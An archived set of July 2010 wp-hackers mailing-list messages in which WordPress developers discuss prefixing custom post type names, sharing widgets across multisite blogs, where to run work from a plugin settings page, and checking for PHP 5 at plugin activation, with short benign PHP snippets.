Message-ID: <AANLkTinzW6giH0-I6WiIjD3ZZ1PJ3W31ZoLLjMGactE1@mail.gmail.com>

Well, the best practice for plugin and theme developers is to use a
unique namespace. Wordpress core post types could then be without a
specific namespace.

Cf. post type "event" and post type "mysite_event".



2010/7/12 Mike Schinkel <mikeschinkel at newclarity.net>:
> Any suggestion on how to avoid a situation of having a core update that adds a new post type keep from breaking any sites, themes and plugins that happen to use the same obvious name?
>
> Maybe the answer is, "Let it happen." ?Okay if so, just thinking it would be nice for it to be explicit as opposed to by happenstance.
>
> -Mike
>
> On Jul 11, 2010, at 7:16 PM, scribu wrote:
>
>> Furthermore, since 'post' and 'page' aren't going anywhere, if the core team
>> were to add a post type for events, calling it 'wp_event' would just be
>> confusing.
>>
>>
>> --
>> http://scribu.net
>> _______________________________________________
>> wp-hackers mailing list
>> wp-hackers at lists.automattic.com
>> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
V?nligen,
Tobias Bergius

From krustyruffle at rustykruffle.com  Sun Jul 11 23:40:41 2010
From: krustyruffle at rustykruffle.com (Krusty Ruffle)
Date: Sun, 11 Jul 2010 19:40:41 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <9C590CD4-A84A-45D0-BB33-74D2BA859F12@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<AANLkTimPM0LcrizM7LOMtpADmYADfxHBsqhrng50njQ8@mail.gmail.com>
	<AANLkTimXUs4_Jo1PJNWJiMofk7NKuX4aPycMC1GeTvlZ@mail.gmail.com>
	<9C590CD4-A84A-45D0-BB33-74D2BA859F12@newclarity.net>
Message-ID: <AANLkTinSRuo9ElwyhytcQDp8g63WhbHICKYZtorrTKB1@mail.gmail.com>

Maybe:

if ( ! post_type_exists( 'new_type' ) ) :
      register_post_type ( 'new_type');
else :
     some_kind_of_warning_about_post_type_already_exists();
endif;

On Sun, Jul 11, 2010 at 7:26 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> Any suggestion on how to avoid a situation of having a core update that
> adds a new post type keep from breaking any sites, themes and plugins that
> happen to use the same obvious name?
>

From dvmorris at gmail.com  Mon Jul 12 01:17:51 2010
From: dvmorris at gmail.com (David Morris)
Date: Sun, 11 Jul 2010 20:17:51 -0500
Subject: [wp-hackers] Sharing widgets across multiple blogs
In-Reply-To: <AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com>
References: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com> 
	<AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com>
Message-ID: <AANLkTileDdnxtBPnjpq7SgMSzjTb9RE7E9m9oJ4im02E@mail.gmail.com>

Ah, I assume that would go in the theme code. That makes sense.

Is there an easy way to show that a particular blog's widgets are shared,
and that the widgets in the admin interface would not actually be used?

Thanks so much for your help,

Dave

On Sun, Jul 11, 2010 at 12:00 PM, scribu <scribu at gmail.com> wrote:

> On Sun, Jul 11, 2010 at 7:56 PM, David Morris <dvmorris at gmail.com> wrote:
>
> > Is there a way to share sidebar widgets across multiple blogs in
> WordPress
> > 3.0?
> >
>
> Just do this:
>
> switch_to_blog(X); // X is the id of the master blog
> // display sidebar
> restore_current_blog();
>
>
> --
> http://scribu.net
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From dennen at gmail.com  Mon Jul 12 01:27:35 2010
From: dennen at gmail.com (Bill Dennen)
Date: Sun, 11 Jul 2010 21:27:35 -0400
Subject: [wp-hackers] Sharing widgets across multiple blogs
In-Reply-To: <AANLkTileDdnxtBPnjpq7SgMSzjTb9RE7E9m9oJ4im02E@mail.gmail.com>
References: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com>
	<AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com>
	<AANLkTileDdnxtBPnjpq7SgMSzjTb9RE7E9m9oJ4im02E@mail.gmail.com>
Message-ID: <AANLkTinsbwrNAnuYLnJc6HIJUHQwIJYd2YHs2PpqDX_c@mail.gmail.com>

> Is there an easy way to show that a particular blog's widgets are shared,
> and that the widgets in the admin interface would not actually be used?

The theme for the blogs inheriting the sidebars from the root blog
could be configured to not allow blog-specific sidebars. Just don't
register any sidebars and the admins of those blogs won't see any that
they can maintain. Does that make sense?

From dvmorris at gmail.com  Mon Jul 12 04:28:34 2010
From: dvmorris at gmail.com (David Morris)
Date: Sun, 11 Jul 2010 23:28:34 -0500
Subject: [wp-hackers] Sharing widgets across multiple blogs
In-Reply-To: <AANLkTinsbwrNAnuYLnJc6HIJUHQwIJYd2YHs2PpqDX_c@mail.gmail.com>
References: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com> 
	<AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com> 
	<AANLkTileDdnxtBPnjpq7SgMSzjTb9RE7E9m9oJ4im02E@mail.gmail.com> 
	<AANLkTinsbwrNAnuYLnJc6HIJUHQwIJYd2YHs2PpqDX_c@mail.gmail.com>
Message-ID: <AANLkTil7uk-CbogQlNUsnGmg1mY4_HFK6TxyyyKwojVe@mail.gmail.com>

Yes, that makes sense, but in this particular case all of the blogs share
the same theme. It's a project I inherited, so I'm trying to be delicate
with the changes I make. Thanks for the tip, that helps me out a lot.

Dave

On Sun, Jul 11, 2010 at 8:27 PM, Bill Dennen <dennen at gmail.com> wrote:

> > Is there an easy way to show that a particular blog's widgets are shared,
> > and that the widgets in the admin interface would not actually be used?
>
> The theme for the blogs inheriting the sidebars from the root blog
> could be configured to not allow blog-specific sidebars. Just don't
> register any sidebars and the admins of those blogs won't see any that
> they can maintain. Does that make sense?
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From wp at andrewnacin.com  Mon Jul 12 05:13:40 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 12 Jul 2010 01:13:40 -0400
Subject: [wp-hackers] Sharing widgets across multiple blogs
In-Reply-To: <AANLkTil7uk-CbogQlNUsnGmg1mY4_HFK6TxyyyKwojVe@mail.gmail.com>
References: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com> 
	<AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com> 
	<AANLkTileDdnxtBPnjpq7SgMSzjTb9RE7E9m9oJ4im02E@mail.gmail.com> 
	<AANLkTinsbwrNAnuYLnJc6HIJUHQwIJYd2YHs2PpqDX_c@mail.gmail.com> 
	<AANLkTil7uk-CbogQlNUsnGmg1mY4_HFK6TxyyyKwojVe@mail.gmail.com>
Message-ID: <AANLkTinVObtnkHBCYtVt82jZH4gTH-uy-IUZvRLDIiwS@mail.gmail.com>

On Mon, Jul 12, 2010 at 12:28 AM, David Morris <dvmorris at gmail.com> wrote:

> Yes, that makes sense, but in this particular case all of the blogs share
> the same theme. It's a project I inherited, so I'm trying to be delicate
> with the changes I make. Thanks for the tip, that helps me out a lot.
>
> Dave


Another potential option is to short-circuit calls to the options table
where the widgets information is stored, using the pre_option_$option hook,
and instead store it in sitemeta. Then make sure you attach a hook to
update_option_$option on the main blog to keep the site meta in sync.

From dvmorris at gmail.com  Mon Jul 12 05:37:58 2010
From: dvmorris at gmail.com (David Morris)
Date: Mon, 12 Jul 2010 00:37:58 -0500
Subject: [wp-hackers] Sharing widgets across multiple blogs
In-Reply-To: <AANLkTinVObtnkHBCYtVt82jZH4gTH-uy-IUZvRLDIiwS@mail.gmail.com>
References: <AANLkTinseqLeTlp1AwDW_43697cfjCKmkYg_DuO2ORid@mail.gmail.com> 
	<AANLkTinSP6rTIhok3cSfV105MuHDFEAIadpvzxe-Hxfj@mail.gmail.com> 
	<AANLkTileDdnxtBPnjpq7SgMSzjTb9RE7E9m9oJ4im02E@mail.gmail.com> 
	<AANLkTinsbwrNAnuYLnJc6HIJUHQwIJYd2YHs2PpqDX_c@mail.gmail.com> 
	<AANLkTil7uk-CbogQlNUsnGmg1mY4_HFK6TxyyyKwojVe@mail.gmail.com> 
	<AANLkTinVObtnkHBCYtVt82jZH4gTH-uy-IUZvRLDIiwS@mail.gmail.com>
Message-ID: <AANLkTimfMgXRMTf-pBogmP8d4xDvVzMnIf4i22PYNfI7@mail.gmail.com>

I see. That might actually work for me. I will look into that tomorrow.
Thanks so much for the help,

Dave

On Mon, Jul 12, 2010 at 12:13 AM, Andrew Nacin <wp at andrewnacin.com> wrote:

> On Mon, Jul 12, 2010 at 12:28 AM, David Morris <dvmorris at gmail.com> wrote:
>
> > Yes, that makes sense, but in this particular case all of the blogs share
> > the same theme. It's a project I inherited, so I'm trying to be delicate
> > with the changes I make. Thanks for the tip, that helps me out a lot.
> >
> > Dave
>
>
> Another potential option is to short-circuit calls to the options table
> where the widgets information is stored, using the pre_option_$option hook,
> and instead store it in sitemeta. Then make sure you attach a hook to
> update_option_$option on the main blog to keep the site meta in sync.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>



-- 
Dave Morris
http://dave.showviz.net/
http://3dcamphouston.com/

From matt at mattjacob.com  Mon Jul 12 07:04:33 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Mon, 12 Jul 2010 00:04:33 -0700
Subject: [wp-hackers] Best way to kick off actual work from plugin settings
	page?
Message-ID: <4C3ABE81.9040202@mattjacob.com>

I'm using the settings API for my plugin's custom settings page, and 
it's working pretty well. Sometimes, though, I want to perform an action 
based on a submitted value instead of just saving the value back to the 
DB. Where's the best place to intercept the form submission and do some 
actual work?

I have two possibilities in my mind:

1. Hook into the admin_init action, since this should come before the 
$_POST array gets wiped out. I can determine if a specific submit button 
was used, if a certain checkbox was checked, etc. and then do some work 
based on those criteria.

2. Use the validation callback in register_setting() to check the 
submitted fields for what I want, do some work, and then return only the 
options I actually want to be persistent. (I'm using a single array for 
all of my options, so it's easy to leave some options out.)

Option #2 seems more elegant, but it's kind of overloading the purpose 
of the callback.

Just for reference, the kind of "work" I'm talking about doing is 
regenerating a secret token or importing existing records to custom 
posts during an upgrade.

Matt

From johnbillion+wp at gmail.com  Mon Jul 12 07:20:02 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 12 Jul 2010 08:20:02 +0100
Subject: [wp-hackers] Best way to kick off actual work from plugin
	settings page?
In-Reply-To: <4C3ABE81.9040202@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
Message-ID: <AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>

On Mon, Jul 12, 2010 at 8:04 AM, Matt Jacob <matt at mattjacob.com> wrote:
> Option #2 seems more elegant, but it's kind of overloading the purpose of
> the callback.

Not at all, this is the purpose of this callback function. I use it
all the time to sanitize and filter the data I want saved (I also use
a single array for all my options in a form). Option #2 is the way to
go.

From matt at mattjacob.com  Mon Jul 12 07:27:28 2010
From: matt at mattjacob.com (Matt Jacob)
Date: Mon, 12 Jul 2010 00:27:28 -0700
Subject: [wp-hackers] Best way to kick off actual work from
 plugin	settings page?
In-Reply-To: <AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
Message-ID: <4C3AC3E0.8090801@mattjacob.com>

On 7/12/10 12:20 AM, John Blackbourn wrote:
> Not at all, this is the purpose of this callback function. I use it
> all the time to sanitize and filter the data I want saved (I also use

Sanitize and filter, sure. I absolutely agree with that. But what about 
this scenario?

User clicks a submit button that says 'Begin Upgrade' or something 
similar. Callback function checks for existence of that input field and 
fires off function to convert, e.g., 1000 records from custom DB table 
to custom post type records.

Maybe I'm getting too philosophical, but it seems like too much work to 
do from a function that's supposed to validate/sanitize inputs. I don't 
see a better way, though.

Matt

From elfin at elfden.co.uk  Mon Jul 12 08:14:53 2010
From: elfin at elfden.co.uk (Rich Pedley)
Date: Mon, 12 Jul 2010 09:14:53 +0100
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
Message-ID: <4C3ACEFD.5020208@elfden.co.uk>

On 11/07/2010 23:57, Mike Schinkel wrote:
> On Jul 10, 2010, at 7:05 PM, Rich Pedley wrote:
>>> Not sure how to get that "best practice" out there so that it
>>> becomes widely know?
>>
>> Well adding it to: http://codex.wordpress.org/Custom_Post_Types
>>
>> and changing the example to use a prefix would be a start.
>
> Okay so I took a first stab at this. I had to set some stakes in
> the ground but if there are any that people disagree with then by
> all means please discuss:
>
> http://codex.wordpress.org/Custom_Post_Types#Custom_Types

Looks better - thanks for adding.

> P.S. Also note that I wrote the following about "Reserved Post Type
> Names" which needs to (eventually?) be finalized by the core team:
>
> Reserved Post Type Names
 > ======================

Not sure I actually agree with this being on there - it could confuse 
people. Perhaps shorten it to simply mention avoid the use of wp_ for 
future compatibility?


Of course having read the page, I then see that the slug may also 
cause incompatibilities as well. Though how much of an issue this 
would be I don't know.

Rich

From johnbillion+wp at gmail.com  Mon Jul 12 08:17:06 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Mon, 12 Jul 2010 09:17:06 +0100
Subject: [wp-hackers] Best way to kick off actual work from plugin
	settings page?
In-Reply-To: <4C3AC3E0.8090801@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
	<4C3AC3E0.8090801@mattjacob.com>
Message-ID: <AANLkTinC2IEhzrU4losgvdhMRWu7YHlgOZ40t70REBPR@mail.gmail.com>

On Mon, Jul 12, 2010 at 8:27 AM, Matt Jacob <matt at mattjacob.com> wrote:
> Maybe I'm getting too philosophical, but it seems like too much work to do
> from a function that's supposed to validate/sanitize inputs. I don't see a
> better way, though.

Your callback function is just like any other function. It gets called
at a specific point, is passed some parameters, and the return value
then goes on to get saved to the database. If you don't run your code
from your callback function then you're just going to run it inside
another equally capable function. Your functions aren't bothered about
their supposed intent.

From jdub at bethesignal.org  Mon Jul 12 08:18:54 2010
From: jdub at bethesignal.org (Jeff Waugh)
Date: Mon, 12 Jul 2010 18:18:54 +1000
Subject: [wp-hackers] Best way to kick off actual work from plugin
 settings page?
In-Reply-To: <4C3AC3E0.8090801@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
	<4C3AC3E0.8090801@mattjacob.com>
Message-ID: <20100712081854.GF1955@waugh.id.au>

<quote who="Matt Jacob">

> User clicks a submit button that says 'Begin Upgrade' or something
> similar. Callback function checks for existence of that input field and
> fires off function to convert, e.g., 1000 records from custom DB table to
> custom post type records.
> 
> Maybe I'm getting too philosophical, but it seems like too much work to do
> from a function that's supposed to validate/sanitize inputs. I don't see a
> better way, though.

A delightful way to approach this might involve wp_schedule_single_event.

Grab (and filter) the input you need, then schedule an event to perform the
(potentially long running) function.

You can even schedule another event in the handler, so you can do the work
in a sliced up queue (if it's really that much).

Make sure that whatever you're doing has mid-process results, so you can
display progress on (most likely) your settings page.

For pure awesomeness, create an AJAX handler to provide mid-process results,
and add a little JavaScript on your settings page to show progress in almost
real time.

:-)

Thanks,

- Jeff

-- 
Ubuntu's Bleeding Edge                      http://ubuntuedge.wordpress.com/
 
     "They cosset us with trappings to shut us up. That way when we say
     'sharecropper!' you can point to my free suit and say 'Shut up pop
                          star.'" - Courtney Love

From mpretty at voceconnect.com  Mon Jul 12 12:39:19 2010
From: mpretty at voceconnect.com (Michael Pretty)
Date: Mon, 12 Jul 2010 08:39:19 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3ACEFD.5020208@elfden.co.uk>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net>	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com>	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>	<4C38FCCC.8030507@elfden.co.uk>	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk>
Message-ID: <4C3B0CF7.2000309@voceconnect.com>


> Not sure I actually agree with this being on there - it could confuse 
> people. Perhaps shorten it to simply mention avoid the use of wp_ for 
> future compatibility?
>
>
> Of course having read the page, I then see that the slug may also 
> cause incompatibilities as well. Though how much of an issue this 
> would be I don't know.
Sorry if some of this has already been said.  I've been out for a few 
days and am playing catch-up.  I first want to say that I somewhat 
disagree with the idea of namespacing post types.  Ideally, content 
shouldn't be tied to the plugin that manages it.  If my site uses events 
that are either created by a plugin or a theme and I want to switch to a 
new plugin that manages that content, I should be able to without having 
to recreate all of those events.  There was a wp-hackers thread a little 
bit ago about standardizing geo-data so it could be shared amongst 
plugins.  I think the fields that shape into something like an event or 
product should also be somewhat standardized.

As for future compatibility with core post types, I really hope that 
core doesn't ever add any more post types.  If anything, I'd prefer if 
posts and pages were no longer built in.  With custom post types and 
taxonomies, we have really opened up the types of web-apps for which 
WordPress can be the backbone.  Then posts and pages could be a core 
plugin automatically included in upgrades and installs.

Michael Pretty
prettyboymp

From wp at andrewnacin.com  Mon Jul 12 13:11:36 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 12 Jul 2010 09:11:36 -0400
Subject: [wp-hackers] Custom Post Types and pending incompatibilities
In-Reply-To: <4C3B0CF7.2000309@voceconnect.com>
References: <2C188E6F-273E-4758-901A-C99AFA575BD4@newclarity.net> 
	<AANLkTikBu-9wNO1Yw1RL1ndJ3OLL8sP78vGV_YzSO87_@mail.gmail.com> 
	<20971828-3EDF-4B53-BECE-0865CA1D33AB@newclarity.net>
	<4C38FCCC.8030507@elfden.co.uk> 
	<A1EF136C-C09C-405A-9117-CBE9CE478E4D@newclarity.net>
	<4C3ACEFD.5020208@elfden.co.uk> <4C3B0CF7.2000309@voceconnect.com>
Message-ID: <AANLkTilNpuHXX-AnvIMNIWgYCDmN1Fvm5fwcWzUwEp4Q@mail.gmail.com>

On Mon, Jul 12, 2010 at 8:39 AM, Michael Pretty <mpretty at voceconnect.com>wrote:

> If anything, I'd prefer if posts and pages were no longer built in. ... Then
> posts and pages could be a core plugin automatically included in upgrades
> and installs.
>

They'll always be built in, but I'd like to see them become like any other
post type (which includes the ability for another plugin to unregister them
without the sky falling), and I imagine we'll be heading further in that
direction in future releases. Same goes for tags and categories.

Just to clarify the last part, without turning this into a discussion on
that. The core plugin experiment is still evolving, but one thing that has
never been considered is that any of them will be bundled.

From jer at simianuprising.com  Mon Jul 12 13:43:50 2010
From: jer at simianuprising.com (Jeremy Clarke)
Date: Mon, 12 Jul 2010 09:43:50 -0400
Subject: [wp-hackers] Best way to kick off actual work from plugin
	settings page?
In-Reply-To: <4C3AC3E0.8090801@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
	<AANLkTimkyupDRApEw64qg6oiW8t65XENMuy27JXL8msv@mail.gmail.com>
	<4C3AC3E0.8090801@mattjacob.com>
Message-ID: <AANLkTinBFcva2hhm4tQu_JQYVJigo1-u4lJ5nrtuuBAH@mail.gmail.com>

On Mon, Jul 12, 2010 at 3:27 AM, Matt Jacob <matt at mattjacob.com> wrote:

>
> Maybe I'm getting too philosophical, but it seems like too much work to do
> from a function that's supposed to validate/sanitize inputs. I don't see a
> better way, though.
>
>
I don't think you're being too philosophical, your argument against using
the sanitization callback for upgrades/management makes sense.

Right now it seems like the sanitization callback is only used as part of
the Settings *Pages* API to process the data, this implies that you could do
anything in the callback that is part of your settings page. The problem is
that conceptually it isn't supposed to be the callback for your settings
page, its supposed to be the filter for the data in that specific setting.
IMHO the way the API is written intends that the filter could be run in
other circumstances to santize the data in your setting. Given this I think
adding logic that isn't related to validating setting fields is probably
better avoided if possible.

IMHO the admin_init route would be better. Essentially you're just falling
back to the pre-API way of managing settings pages, which makes sense
because in your described scenario you aren't actually managing the setting,
you're doing upgrade/management tasks. Those should stay on the page and
leave the Settings definitions as pure as possible.

-- 
Jeremy Clarke | http://jeremyclarke.org
Code and Design | http://globalvoicesonline.org

From eckman.john at gmail.com  Mon Jul 12 14:26:43 2010
From: eckman.john at gmail.com (John Eckman)
Date: Mon, 12 Jul 2010 10:26:43 -0400
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com>
Message-ID: <F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>

Otto - recently in wp-hackers you reposted this code, which I've seen posted before. 

I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm still having an issue. 

Because my plugin uses try/catch syntax, the minute it gets uploaded, before the user can even activate it, they get a syntax error about an unexpected open curly brace {. 

Any suggestions on how to work around that?


On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:

> /**
> * plugin_activation_check()
> *
> * Replace "plugin" with the name of your plugin
> */
> function plugin_activation_check(){
> 	if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> 		deactivate_plugins(basename(__FILE__)); // Deactivate ourself
> 		wp_die("Sorry, but you can't run this plugin, it requires PHP 5 or higher.");
> 	}
> }
> register_activation_hook(__FILE__, 'plugin_activation_check');
> 
> 
> -Otto


----------------------------------------
John Eckman
eckman.john at gmail.com
http://www.johneckman.com/






From wp at andrewnacin.com  Mon Jul 12 14:29:53 2010
From: wp at andrewnacin.com (Andrew Nacin)
Date: Mon, 12 Jul 2010 10:29:53 -0400
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com> 
	<F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
Message-ID: <AANLkTinzs8A47iG4koSfbOzVj--5vTMHLw1plqLQG3wQ@mail.gmail.com>

On Mon, Jul 12, 2010 at 10:26 AM, John Eckman <eckman.john at gmail.com> wrote:

> Because my plugin uses try/catch syntax, the minute it gets uploaded,
> before the user can even activate it, they get a syntax error about an
> unexpected open curly brace {.
>
> Any suggestions on how to work around that?


Keep the rest of your plugin in a second file and only include it when you
know you can support it.

From eric at eamann.com  Mon Jul 12 14:31:22 2010
From: eric at eamann.com (Eric Mann)
Date: Mon, 12 Jul 2010 07:31:22 -0700 (PDT)
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com>
	<F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
Message-ID: <715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de>

John,
?
We'd need to see how your try/catch structure is formed to help you fix that
...?

On July 12, 2010 at 2:26 PM John Eckman <eckman.john at gmail.com> wrote:

> Otto - recently in wp-hackers you reposted this code, which I've seen posted
> before.
>
> I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm still
> having an issue.
>
> Because my plugin uses try/catch syntax, the minute it gets uploaded, before
> the user can even activate it, they get a syntax error about an unexpected
> open curly brace {.
>
> Any suggestions on how to work around that?
>
>
> On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:
>
> > /**
> > * plugin_activation_check()
> > *
> > * Replace "plugin" with the name of your plugin
> > */
> > function plugin_activation_check(){
> >? ? ? ? ?if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> >? ? ? ? ? ? ? ? ?deactivate_plugins(basename(__FILE__)); // Deactivate
> >ourself
> >? ? ? ? ? ? ? ? ?wp_die("Sorry, but you can't run this plugin, it requires
> >PHP 5 or higher.");
> >? ? ? ? ?}
> > }
> > register_activation_hook(__FILE__, 'plugin_activation_check');
> >
> >
> > -Otto
>
>
> ----------------------------------------
> John Eckman
> eckman.john at gmail.com
> http://www.johneckman.com/
>
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers

From dougal at gunters.org  Mon Jul 12 15:06:11 2010
From: dougal at gunters.org (Dougal Campbell)
Date: Mon, 12 Jul 2010 11:06:11 -0400
Subject: [wp-hackers] Best way to kick off actual work from plugin
 settings page?
In-Reply-To: <4C3ABE81.9040202@mattjacob.com>
References: <4C3ABE81.9040202@mattjacob.com>
Message-ID: <4C3B2F63.2060608@gunters.org>

On Jul 12 2010 3:04 AM, Matt Jacob wrote:
> I'm using the settings API for my plugin's custom settings page, and 
> it's working pretty well. Sometimes, though, I want to perform an 
> action based on a submitted value instead of just saving the value 
> back to the DB. Where's the best place to intercept the form 
> submission and do some actual work?
>
> I have two possibilities in my mind:
>
> 1. Hook into the admin_init action, since this should come before the 
> $_POST array gets wiped out. I can determine if a specific submit 
> button was used, if a certain checkbox was checked, etc. and then do 
> some work based on those criteria.
>
> 2. Use the validation callback in register_setting() to check the 
> submitted fields for what I want, do some work, and then return only 
> the options I actually want to be persistent. (I'm using a single 
> array for all of my options, so it's easy to leave some options out.)
>
> Option #2 seems more elegant, but it's kind of overloading the purpose 
> of the callback.
>
> Just for reference, the kind of "work" I'm talking about doing is 
> regenerating a secret token or importing existing records to custom 
> posts during an upgrade.
>

I've used both methods before. Which I choose seems to depend on context 
and complexity of the tasks I'm performing. Quick, simple things can 
often slip into the settings validation callback. For more complex 
functions I might catch it on admin_init. Or sometimes I'll use a hybrid 
method -- detection in the validation callback, setting a transient 
flag, which I then look for later (perhaps for a cron schedule).


-- 
Dougal Campbell <dougal at gunters.org>
http://dougal.gunters.org/
http://twitter.com/dougal
http://twitual.com/

From KrisY at tbs.uk.com  Mon Jul 12 17:02:03 2010
From: KrisY at tbs.uk.com (Kris Young)
Date: Mon, 12 Jul 2010 18:02:03 +0100
Subject: [wp-hackers] Testing for PHP 5 before activating
In-Reply-To: <715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de>
References: <mailman.9959.1278661751.1338.wp-hackers@lists.automattic.com><F1604193-F386-4F6D-B5BB-F9FCF4C11D57@gmail.com>
	<715634122.223802.1278945082553.JavaMail.open-xchange@oxusltgw12.schlund.de>
Message-ID: <CD47955B7E065D48AB5CF226C2ED75C02E303B@tbs-sbs01.TBS.local>

Would have thought that a stern warning on the plugin download page would do enough. Especially in coding policy on WordPress 3, PHP4 is being slowly squeezed out.

Do you anticipate a lot of PHP4 users, or is it a 'better-safe-than-sorry' measure?

Kris

-----Original Message-----
From: wp-hackers-bounces at lists.automattic.com [mailto:wp-hackers-bounces at lists.automattic.com] On Behalf Of Eric Mann
Sent: 12 July 2010 15:31
To: wp-hackers at lists.automattic.com
Subject: Re: [wp-hackers] Testing for PHP 5 before activating

John,
?
We'd need to see how your try/catch structure is formed to help you fix that
...?

On July 12, 2010 at 2:26 PM John Eckman <eckman.john at gmail.com> wrote:

> Otto - recently in wp-hackers you reposted this code, which I've seen posted
> before.
>
> I'm using it in wpbook (wordpress.org/extend/plugins/wpbook) but I'm still
> having an issue.
>
> Because my plugin uses try/catch syntax, the minute it gets uploaded, before
> the user can even activate it, they get a syntax error about an unexpected
> open curly brace {.
>
> Any suggestions on how to work around that?
>
>
> On Jul 9, 2010, at 3:49 AM, Otto <otto at ottodestruct.com> wrote:
>
> > /**
> > * plugin_activation_check()
> > *
> > * Replace "plugin" with the name of your plugin
> > */
> > function plugin_activation_check(){
> >? ? ? ? ?if (version_compare(PHP_VERSION, '5.0.0', '<')) {
> >? ? ? ? ? ? ? ? ?deactivate_plugins(basename(__FILE__)); // Deactivate
> >ourself
> >? ? ? ? ? ? ? ? ?wp_die("Sorry, but you can't run this plugin, it requires
> >PHP 5 or higher.");
> >? ? ? ? ?}
> > }
> > register_activation_hook(__FILE__, 'plugin_activation_check');
> >
> >
> > -Otto
>
>
> ----------------------------------------
> John Eckman
> eckman.john at gmail.com
> http://www.johneckman.com/
>
>
>
>
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
_______________________________________________
wp-hackers mailing list
wp-hackers at lists.automattic.com
http://lists.automattic.com/mailman/listinfo/wp-hackers

